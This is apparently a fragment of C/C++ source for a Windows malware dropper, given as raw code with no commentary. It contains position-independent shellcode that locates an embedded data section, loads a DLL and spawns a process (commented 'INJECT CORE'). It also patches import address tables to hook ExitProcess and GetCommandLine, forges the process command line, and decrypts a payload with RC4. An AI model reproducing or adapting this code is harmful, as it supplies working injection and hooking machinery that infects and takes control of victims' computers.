	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
	WINEXEC pfn_WinExec = (WINEXEC) dll_calls[CALL_WINEXEC];
	FREELIBRARY pfn_FreeLibrary = (FREELIBRARY) dll_calls[CALL_FREELIBRARY];
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	GETPROCADDRESS pfn_GetProcAddress = (GETPROCADDRESS) dll_calls[CALL_GETPROCADDRESS];
	LOADLIBRARY pfn_LoadLibrary = (LOADLIBRARY) dll_calls[CALL_LOADLIBRARY];


	char* complete_path = (char*) pfn_VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
	
	_MEMCPY_( complete_path, STRING(STRIDX_RUNDLL), STRLEN(STRIDX_RUNDLL) );
	_STRCAT_( complete_path, header->dllPath);
	_STRCAT_( complete_path, STRING(STRIDX_COMMAHFF8));
	
	MESSAGE(complete_path);
	
	HMODULE hLib = pfn_LoadLibrary(header->dllPath);
	if (hLib == INVALID_HANDLE_VALUE)
		goto THREAD_EXIT;

	HFF5 pfn_HFF5 = (HFF5) pfn_GetProcAddress(hLib, STRING(STRIDX_HFF5));
	if (pfn_HFF5 == NULL)
		goto THREAD_EXIT;
	
	STARTUPINFO* startupinfo = (STARTUPINFO*) pfn_VirtualAlloc(NULL, sizeof(STARTUPINFO), MEM_COMMIT, PAGE_READWRITE);
	startupinfo->cb = sizeof(STARTUPINFO);
	
	PROCESS_INFORMATION* procinfo = (PROCESS_INFORMATION*) pfn_VirtualAlloc(NULL, sizeof(PROCESS_INFORMATION), MEM_COMMIT, PAGE_READWRITE);
	
	// *
	// ** INJECT CORE !!!
	// *

	MESSAGE(STRING(STRIDX_HFF5CALLING));
	pfn_HFF5(complete_path, NULL, startupinfo, procinfo);
	MESSAGE(STRING(STRIDX_HFF5CALLED));

THREAD_EXIT:
	
	if (complete_path) pfn_VirtualFree(complete_path, 0, MEM_RELEASE);
	if (startupinfo) pfn_VirtualFree(startupinfo, 0, MEM_RELEASE);
	if (procinfo) pfn_VirtualFree(procinfo, 0, MEM_RELEASE);
	if (header->dllPath) pfn_VirtualFree(header->dllPath, 0, MEM_RELEASE);

	header->synchro = 1;
	
	return 0;
}
FUNCTION_END(CoreThreadProc);


VOID WINAPI ExitProcessHook(__in  UINT uExitCode)
{
	DWORD dwCurrentAddr = 0;
	DWORD dwMagic = 0;
	
	// Get current EIP in dwCurrentAddr
	__asm{
		call lbl_ref1
lbl_ref1:
		pop dwCurrentAddr
	}
	
	// *** Find the ending marker of data section <E> 
	while ( dwMagic != 0x003E453C )
		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
	
	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));

	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);

	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
	SLEEP pfn_Sleep = (SLEEP) dll_calls[CALL_SLEEP];
	
	MESSAGE(STRING(STRIDX_INEXITPROC_HOOK));
	
	while (header->synchro != 1)
		pfn_Sleep(HOOKSLEEPTIME);
	
	MESSAGE(STRING(STRIDX_VECTORQUIT));
	EXITPROCESS pfn_OriginalRtlExitUserProcess = (EXITPROCESS) dll_calls[CALL_RTLEXITUSERPROCESS];
	EXITPROCESS pfn_OriginalExitProcess = (EXITPROCESS) dll_calls[CALL_EXITPROCESS];

	if (pfn_OriginalRtlExitUserProcess)
		pfn_OriginalRtlExitUserProcess(uExitCode);
	else // for <= xp sp3
		pfn_OriginalExitProcess(uExitCode);
}
FUNCTION_END(ExitProcessHook);

LPSTR WINAPI GetCommandLineAHook()
{
	DWORD dwCurrentAddr = 0;
	DWORD dwMagic = 0;
	
	// Get current EIP in dwCurrentAddr
	__asm{
		call lbl_ref1
	lbl_ref1:
		pop dwCurrentAddr
	}
	
	// *** Find the ending marker of data section <E> 
	while ( dwMagic != 0x003E453C )
		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));

	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
	
	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);

	if(header->cmdLineA)
		return header->cmdLineA;

	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);

	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	GETCOMMANDLINEA pfn_OriginalGetCommandLineA = (GETCOMMANDLINEA) dll_calls[CALL_GETCOMMANDLINEA];

	LPSTR OriginalCommandLine = pfn_OriginalGetCommandLineA();
	ULONG len = _STRLEN_(OriginalCommandLine);
	LPSTR FakeCommandLine = (LPSTR)pfn_VirtualAlloc(NULL, len + 7, MEM_COMMIT, PAGE_READWRITE);

	_MEMCPY_(FakeCommandLine, OriginalCommandLine, len);
	*(PUSHORT)&FakeCommandLine[len] = 0x2f20; // '/ '
	*(PULONG)&FakeCommandLine[len+2] = 0x4352434e; // 'NCRC'
	FakeCommandLine[len+6] = 0x0;

	header->cmdLineA = FakeCommandLine;
	return header->cmdLineA;
}
FUNCTION_END(GetCommandLineAHook);

LPWSTR WINAPI GetCommandLineWHook()
{
	DWORD dwCurrentAddr = 0;
	DWORD dwMagic = 0;
	
	// Get current EIP in dwCurrentAddr
	__asm{
		call lbl_ref1
	lbl_ref1:
		pop dwCurrentAddr
	}
	
	// *** Find the ending marker of data section <E> 
	while ( dwMagic != 0x003E453C )
		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));

	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
	
	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);

	if(header->cmdLineW)
		return header->cmdLineW;

	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	char * dlls = (char *) (((char*)header) + header->dlls.offset);
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);

	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	GETCOMMANDLINEW pfn_OriginalGetCommandLineW = (GETCOMMANDLINEW) dll_calls[CALL_GETCOMMANDLINEW];

	LPWSTR OriginalCommandLine = pfn_OriginalGetCommandLineW();
	ULONG len = _STRLENW_(OriginalCommandLine);
	LPWSTR FakeCommandLine = (LPWSTR)pfn_VirtualAlloc(NULL, len + 14, MEM_COMMIT, PAGE_READWRITE);

	_MEMCPY_(FakeCommandLine, OriginalCommandLine, len);
	*(PULONG)&((PBYTE)FakeCommandLine)[len] = 0x002f0020; // ' /'
	*(PULONG)&((PBYTE)FakeCommandLine)[len+4] = 0x0043004e; // 'NC'
	*(PULONG)&((PBYTE)FakeCommandLine)[len+8] = 0x00430052; // 'RC'
	*(PUSHORT)&((PBYTE)FakeCommandLine)[len+12] = 0x0000;

	header->cmdLineW = FakeCommandLine;
	return header->cmdLineW;
}
FUNCTION_END(GetCommandLineWHook);


void rc4_skip(const unsigned char *key, size_t keylen, size_t skip,
							unsigned char *data, size_t data_len, DataSectionHeader *header)
{
	unsigned int i, j, k;
	unsigned char *pos;
	size_t kpos;
	
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	
	unsigned char *S = (unsigned char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
	
	/* Setup RC4 state */
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	kpos = 0;
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[kpos]) & 0xff;
		kpos++;
		if (kpos >= keylen)
			kpos = 0;
		S_SWAP(i, j);
	}
	
	/* Skip the start of the stream */
	i = j = 0;
	for (k = 0; k < skip; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
	}
	
	/* Apply RC4 to data */
	pos = data;
	for (k = 0; k < data_len; k++) {
		i = (i + 1) & 0xff;
		j = (j + S[i]) & 0xff;
		S_SWAP(i, j);
		*pos++ ^= S[(S[i] + S[j]) & 0xff];
	}
	
	pfn_VirtualFree(S, 0, MEM_RELEASE);
}
FUNCTION_END(rc4_skip);

DWORD hookCall(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DataSectionHeader *header)
{
	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) dll_calls[CALL_VIRTUALQUERY];
	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT) dll_calls[CALL_VIRTUALPROTECT];
	GETPROCADDRESS pfn_GetProcAddress = (GETPROCADDRESS) dll_calls[CALL_GETPROCADDRESS];
	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) dll_calls[CALL_GETMODULEHANDLE];

#ifdef _DEBUG
	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
	char * strings = (char *) (((char*)header) + header->strings.offset);
	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
#endif	

	HMODULE modHandle = pfn_GetModuleHandle(dll);
	// check if dll is loaded
	if(modHandle == NULL)
		return -1;

	// function address we're going to hook
	DWORD needAddress = (DWORD)pfn_GetProcAddress(modHandle, name);
	IMAGE_IMPORT_DESCRIPTOR const * lpImp = (IMAGE_IMPORT_DESCRIPTOR *)((UINT_PTR)imageBase + IAT_rva);
	while(lpImp->Name) {
		CHAR* dllName_RO = (CHAR*)((UINT_PTR)imageBase) + lpImp->Name;
		CHAR* dllName = (CHAR*) pfn_VirtualAlloc(NULL, _STRLEN_(dllName_RO) + 1, MEM_COMMIT, PAGE_READWRITE);
		if(dllName == NULL)
			return -1;

		_MEMCPY_(dllName, dllName_RO, _STRLEN_(dllName_RO) + 1);
		if(!_STRCMPI_(dllName, dll)) {
			UINT_PTR dwOriginalThunk = (lpImp->OriginalFirstThunk ? lpImp->OriginalFirstThunk : lpImp->FirstThunk);
			IMAGE_THUNK_DATA const *itd = (IMAGE_THUNK_DATA *)(imageBase + dwOriginalThunk);
			UINT_PTR dwThunk = lpImp->FirstThunk;
			IMAGE_IMPORT_BY_NAME const * name_import = (IMAGE_IMPORT_BY_NAME *)(imageBase + itd->u1.AddressOfData);

			DWORD* ptrToCallAddr = (DWORD*) (imageBase + dwThunk);		
			do
			{
				if(needAddress == *ptrToCallAddr)
				{
					DWORD oldProtect = 0;
					MEMORY_BASIC_INFORMATION * mbi = (MEMORY_BASIC_INFORMATION *) 
						pfn_VirtualAlloc(
							NULL, 
							sizeof(MEMORY_BASIC_INFORMATION), 
							MEM_COMMIT, 
							PAGE_READWRITE);

					pfn_VirtualQuery((LPCVOID)ptrToCallAddr, mbi, sizeof(MEMORY_BASIC_INFORMATION));
					pfn_VirtualProtect(mbi->BaseAddress, mbi->RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
					*ptrToCallAddr = (DWORD) hookFunc;
					pfn_VirtualProtect(mbi->BaseAddress, mbi->RegionSize, oldProtect, NULL);

					pfn_VirtualFree(mbi, 0, MEM_RELEASE);
					pfn_VirtualFree(dllName, 0, MEM_RELEASE);
					return 0;
				}
				ptrToCallAddr++;
	
			}
			while(*ptrToCallAddr != NULL);
		}

		pfn_VirtualFree(dllName, 0, MEM_RELEASE);
		lpImp++;
	}

	return -1;
}
FUNCTION_END(hookCall);

#pragma code_seg()
#pragma optimize( "", on )

#endif /* WIN32 */

void generate_key(std::string& key, unsigned int length) 
{
	srand( (unsigned int) time(NULL) );
	
	std::ostringstream outStream;
	
	// initalize seed and fill array with random fuss
	for (unsigned int i = 0; i < length; i++) {
		outStream << std::setw(2) << std::setfill('0') << std::hex << (unsigned int) (rand() % 100);
	}

	key = outStream.str();
}

__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz )
{
	while ( _sz ) ((BYTE *)_dst)[--_sz] = _val;
}

__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz )
{
	while ( _sz-- ) ((BYTE *)_dst)[_sz] = ((BYTE *)_src)[_sz];
}

__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz )
{
	while ( _sz-- )
	{
		if ( ((BYTE *)_src1)[_sz] != ((BYTE *)_src2)[_sz] )
			return FALSE;
	}

	return TRUE;
}

__forceinline size_t _STRLEN_(char *_src)
{
	size_t count = 0;
	while( _src && *_src++ )
		count++;
	return count;
}

size_t _STRLENW_(wchar_t *_src)
{	
	ULONG count = 0;
	while(_src && (*(PUSHORT)_src++ != 0x0000))
		count += 2;
	return count;
}

__forceinline void _TOUPPER_(char *s)
{
	for(; *s; s++)
		if(('a' <= *s) && (*s <= 'z'))
			*s = 'A' + (*s - 'a');
}

__forceinline  void _TOUPPER_CHAR(char *c)
{
	if((*c >= 'a') && (*c <= 'z'))
		*c = 'A' + (*c - 'a');
}

__forceinline void _TOLOWER_(char *s)
{
	for(; *s; s++)
		if(('A' <= *s) && (*s <= 'Z'))
			*s = 'a' + (*s - 'A');
}

__forceinline int _STRCMP_(char *_src1, char *_src2)
{
	size_t sz = _STRLEN_(_src1);

	if ( _STRLEN_(_src1) != _STRLEN_(_src2) )
		return 1;

	return _MEMCMP_(_src1, _src2, sz ) ? 0 :  1;
}

__forceinline int _STRCMPI_(char *_src1, char *_src2)
{
	char* s1 = _src1;
	char* s2 = _src2;

	while (*s1 && *s2)
	{
		char a = *s1;
		char b = *s2;

		_TOUPPER_CHAR(&a);
		_TOUPPER_CHAR(&b);

		if (a != b)
			return 1;

		s1++;
		s2++;
	}

	return 0;
}

__forceinline char* _STRRCHR_(char const *s, int c)
{
	char* rtnval = 0;

	do {
		if (*s == c)
			rtnval = (char*) s;
	} while (*s++);
	return (rtnval);
}

__forceinline void _STRCAT_(char*_src1, char *_src2)
{
	char* ptr = _src1 + _STRLEN_(_src1);
	_MEMCPY_(ptr, _src2, _STRLEN_(_src2));
	ptr += _STRLEN_(_src2);
	*ptr = '\0';
}

__forceinline void _ZEROMEM_(char* mem, int size)
{
	for (int i = 0; i < size; i++)
		mem[i] = 0;
}

__forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD length )
{
	for (DWORD i = 0; i < (length / 2); i++) {
		// char a = against[i]; _TOUPPER_CHAR(a);
		// char b = unicode[i*2]; _TOUPPER_CHAR(b);
		if ( ! _MEMCMP_(against + i, unicode + (i*2), 1))
			return false;
	}
	
	return true;
}

bool dumpDropperFiles()
{
	bf::path dir("dropper");
	if ( !bf::create_directory( dir ) ) {
		cout << "Cannot create directory " << dir << endl;
		return false;
	}

	return true;
}